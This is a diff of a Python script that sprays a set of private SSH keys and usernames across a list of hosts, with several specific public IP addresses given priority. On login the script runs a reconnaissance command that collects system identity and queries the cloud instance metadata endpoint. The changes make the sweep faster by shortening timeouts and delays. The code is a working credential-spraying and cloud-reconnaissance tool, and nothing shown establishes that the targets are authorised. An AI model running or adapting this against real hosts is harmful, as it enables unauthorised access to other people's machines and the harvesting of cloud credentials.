@@ -28,7 +28,7 @@ CENSUS = ("id; hostname; hostname -I; uname -r; "
           "systemctl is-active ul-prl@0 2>/dev/null; ls /etc/ul 2>/dev/null; "
           "curl -s -m 3 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' | head -c 260")
 
-KEYS = ["keys2/k04_ibm_key.pem_", "az/ibm_key.pem", "az/azadmin.pem"]
+KEYS = ["keys2/k04_ibm_key.pem_", "az/azadmin.pem"]
 
 def load_hosts():
     rows = []
@@ -50,14 +50,14 @@ def prep_keys():
 
 def ssh_try(host, user, key, timeout=45):
     cmd = (f"ssh -i {key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
-           f"-o BatchMode=yes -o ConnectTimeout=12 -o IdentitiesOnly=yes "
+           f"-o BatchMode=yes -o ConnectTimeout=8 -o IdentitiesOnly=yes "
            f"-o PreferredAuthentications=publickey -p 22 {user}@{host} '{CENSUS}'")
     rc, out, err = sh(cmd, timeout=timeout)
     return rc, out, err
 
 def ssh_wave(limit=16):
     hosts = load_hosts()
-    prio = {"20.205.187.223": 0, "20.50.113.151": 0, "23.100.38.120": 0, "172.174.31.97": 1}
+    prio = {"20.205.187.223": 0, "20.50.113.151": 0, "172.174.31.97": 0, "23.100.38.120": 0}
     hosts.sort(key=lambda r: (prio.get(r[1], 5), r[0]))
     keys = prep_keys()
     log("ssh.keys", keys, "hosts_total", len(hosts), "limit", limit)
@@ -67,7 +67,7 @@ def ssh_wave(limit=16):
         if done >= limit:
             break
         got = None
-        for user in ["ubuntu", duser, "azureuser"]:
+        for user in ["ubuntu", duser]:
             for key in keys:
                 t0 = time.time()
                 rc, out, err = ssh_try(ip, user, key)
@@ -91,7 +91,7 @@ def ssh_wave(limit=16):
                 log("ssh.negative_control", ip, rc, (err.strip().splitlines() or [""])[-1][:120])
         done += 1
         open(f"{RES}/ssh_results.tsv", "w").write("".join(res))
-        time.sleep(12)
+        time.sleep(6)
     return res
 
 # ---------------------------------------------------------------- blob SAS
